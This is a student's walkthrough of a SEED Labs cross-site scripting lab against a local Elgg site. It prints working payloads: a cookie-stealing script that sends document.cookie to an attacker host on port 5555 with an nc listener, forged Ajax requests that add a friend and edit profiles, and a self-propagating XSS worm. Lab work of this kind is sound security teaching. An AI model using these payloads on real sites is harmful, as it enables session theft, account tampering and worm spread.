# CSLab5 - Cross-Site Scripting (XSS) Attack
CS5173-Lab5: Cross-Site Scripting (XSS) Attack

# 1. Description
### 1.1 Cross-Site Scripting (XSS) Attack:
Cross-site scripting is a common form of vulnerability found with web applications. The vulnerability allows an attacker to inject malicious code; that is, Active Content like JavaScript programs into the victim's web browser. Using this malicious code, attackers can steal a victim's credentials, such as session cookies. The access control policies-i.e., the same origin policy-employed by browsers to protect those credentials can be bypassed by exploiting XSS vulnerabilities.

# 2. Lab Environment Setup
### 2.1 DNS Setup:
There are several Websites setup for this Lab which are hosted by the container `10.9.0.5`. We need to map the names of the web server to this IP address. The following entries are to be added to the `/etc/hosts` file, we need to use the root privilege to modify the `hosts` file.

```
10.9.0.5 www.seed-server.com
10.9.0.5 www.example32a.com
10.9.0.5 www.example32b.com
10.9.0.5 www.example32c.com
10.9.0.5 www.example60.com
10.9.0.5 www.example70.com
```

### 2.2 Container Setup and Commands:
- Download `Labsetup.zip` file from Seed labs website.
- Use the `docker-compose.yml` file to setup the lab environment.
- Some useful commands for the `docker-compose` to start or end:
  
  ```
  $ docker-compose build # Build the container image
  $ docker-compose up # Start the container
  $ docker-compose down # Shut down the container
  ```

- Aliases for the Compose commands above

  ``` 
  $ dcbuild # Alias for: docker-compose build
  $ dcup # Alias for: docker-compose up
  $ dcdown # Alias for: docker-compose down
  ```
- Use `dockerps` command to get a shell inside hostC


### 2.3 Elgg Web Application:
- Elgg is a web-based social-networking application. This website is used in this Lab to perform XSS attack.
- The web server used for this web application is `10.9.0.5 -- http://www.seed-server.com/`
- To start from a clean database we have to run the command:
  `sudo rm -rf mysql_data`
- There are few users which are already created on the Elgg server. Below are the username and passwords:
```
----------------------------
UserName | Password
----------------------------
admin | seedelgg
alice | seedalice
boby | seedboby
charlie | seedcharlie
samy | seedsamy
----------------------------
```
  
  
# 3. Lab Tasks
**3.1: Preparation: Getting Familiar with the "HTTP Header Live" tool** 
In this Lab we need to construct HTTP requests. To know what an acceptable HTTP request in Elgg Website looks like, we need to capture and analyze the HTTP request. For this purpose, we are using `HTTP Header Live` firefox add-on.

**Task 1: Posting a Malicious Message to Display an Alert Window** 
- **Objective:** The objective of this task is to insert a JavaScript program in your Elgg profile so that, when another user opens your profile, the JavaScript program gets executed and an alert window comes up.

```
<script>alert(’XSS’);</script>
```

```
<script type="text/javascript"
src="http://www.example.com/myscripts.js">
</script>
```

- Embedding any one of the above javascript codes in the profile will see the alert window.

**Task 2: Posting a Malicious Message to Display Cookieso** 
- **Objective:** The objective of this task is to include a JavaScript program in your Elgg profile such that, when another user accesses your profile the user's cookies will be show in the alert window.

```
<script> alert(document.cookie); </script>
```

- Using the above javascript code similarly like the above task, alert window will be popedup.

**Task 3: Stealing Cookies from the Victim’s Machine** 
- The malicious JavaScript code written in the previous task can print out the user's cookies, but only the user can see the cookies-not the attacker.
- **Objective:** The objective of this task is that the attacker wants the JavaScript code to send the cookies to himself/herself.
- In order to achieve that, the malicious JavaScript code needs to send an HTTP request to the attacker, appending the cookies to the request.
- We can do this by having the malicious JavaScript insert an `<img>` tag whose `src` attribute is set to the attacker's machine.
- As the JavaScript inserts the `img` tag, the browser tries to load the image from the URL in the `src` field; this results in an HTTP GET request sent to the attacker's machine.
- Below is a JavaScript that sends the cookies to port 5555 of the attacker's machine, at IP address `10.9.0.1`, where the attacker is running a TCP server listening on the same port.

```
<script>document.write(’<img src=http://10.9.0.1:5555?c=’ + escape(document.cookie) + ’ >’); </script>
```
- Another command used by attackers is `netcat` (or `nc`) that, if run with the option `-l`, becomes a TCP server listening for incoming connections on the given port.
- This server program basically prints out whatever is sent by the client and sends to the client whatever is typed by the user running the server. in order to listen on port 5555 type the following command:
  `$ nc -lknv 5555`
- The -l option is used to specify that nc should listen for an incoming connection rather than initiate a connection to a remote host.
- The -nv option is used to have nc give more verbose output.
- The -k option means when a connection is completed, listen for another one.

**Task 4: Becoming the Victim’s Friend** 
- In this task we will write a malicious JavaScript program that directly forges HTTP requests from the browser of the victim, without the interference of the attacker.
- **Objective:** The objective of this task is to add Samy as a friend to the victim. We will go ahead and create a user named Samy on the Elgg server, its username is samy.
- Write the Javascript program to send a add friend request in Elgg.
- Firefox's HTTP inspection tool gives the contents of any HTTP request message sent from the browser.
- Javascript code for add friend request:

  ```
  <script type="text/javascript">
  window.onload = function ()
  {var Ajax=null;
  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
  var token="&__elgg_token="+elgg.security.token.__elgg_token;

  //Construct the HTTP request to add Samy as a friend.
  var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token;

  //Create and send Ajax request to add friend
  Ajax=new XMLHttpRequest();
  Ajax.open("GET", sendurl, true);
  Ajax.send();
  }
  </script>
  ```
- The above code should be placed in the `About Me` field of Samy’s profile page in Elgg Website.
- This field provides two editing modes: Editor mode (default) and Text mode. The Editor mode adds extra HTML code to the text typed into the field, while the Text mode does not.
- Since we do not want any extra code added to our attacking code, the Text mode should be enabled before entering the above JavaScript code.
- This can be done by clicking on `Edit HTML`, which can be found at the top right of the `About Me` text field.
  
**Task 5: Modifying the Victim’s Profile** 
- **Objective:** The objective of this task is to modify the victim’s profile when the victim visits Samy’s page.
- Write an XSS worm to complete the task. This worm does not self-propagate; in task 6, we should make it self-propagating.
- Write a malicious JavaScript program that forges HTTP requests directly from the victim’s browser, without the intervention of the attacker.
- Using firefox's Inspection Tool, findout how HTTP Post request is constructed to modify a user's profile, specifically in the `About Me` field.
- Javascript program that forges HTTP requests directly from the Victim's browser:
  ```
  <script type="text/javascript">window.onload = function()
  {
  //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
  //and Security Token __elgg_token
  
  var userName="&name="+elgg.session.user.name;
  var guid="&guid="+elgg.session.user.guid;
  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
  var token="&__elgg_token="+elgg.security.token.__elgg_token;
  
  //Construct the content of your url.
  var samyGuid=59;    //FILL IN
  var desc="&description=Sammy Environment for cs xss"+"&accesslevel[description]=2"
  var content=ts + token+userName+guid+desc;     
  var sendurl=http://www.seed-server.com/action/profile/edit;     
  if(elgg.session.user.guid!=samyGuid)
  {

   //Create and send Ajax request to modify profile
  var Ajax=null;
  Ajax=new XMLHttpRequest();
  Ajax.open("POST", sendurl, true);
  Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
  Ajax.send(content);
  }
  }
  </script>

  ```
- The above code should be placed in the "About Me" field of Samy’s profile page, and the Text mode should be enabled before entering the above JavaScript code.

**Task 6: Writing a Self-Propagating XSS Worme** 
- **Objective:** The objective of this task is to implement a worm, which not only changes the victim's profile and added "Samy" as a friend, but also appends a copy of the worm itself to the victim's profile, so that the victim is transformed into an attacker.
- To achieve self-propagation, when the malicious JavaScript modifies the victim’s profile, it should copy itself to the victim’s profile.
- Javascript code to run Self propagating XSS worme:

   ```
  // Attack 3 - Task 6: WSelf-Propagating XSS Worm:
  // DOM Approach:
  <script type="text/javascript" id="worm">
    window.onload = function() {
      var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
      var jsCode = document.getElementById("worm").innerHTML;
      var tailTag = "</" + "script>";
      
      // Put all the pieces together, and apply the URI encoding
      var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
      
      // Set the content of the description field and access level
      var desc = "&description=Samy is my hero" + wormCode;
      desc += "&accesslevel[description]=2";
      
      // Get the name, guid, timestamp, and token.
      var name = "&name=" + elgg.session.user.name;
      var guid = "&guid=" + elgg.session.user.guid;
      var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
      var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
      
      // Set the URL
      var sendurl = "http://www.seed-server.com/action/profile/edit/";
      var content = token + ts + name + desc + guid;
      // Construct and send the Ajax request
  	var attackerguid = 59;
  	if (elgg.session.user.guid != attackerguid) {
   	   // Create and send Ajax request to modify profile
    	  var Ajax = null;
    	  Ajax = new XMLHttpRequest();
    	  Ajax.open("POST", sendurl, true);
    	  Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    	  Ajax.send(content);
  	}
  	}
  </script>
  ```
   
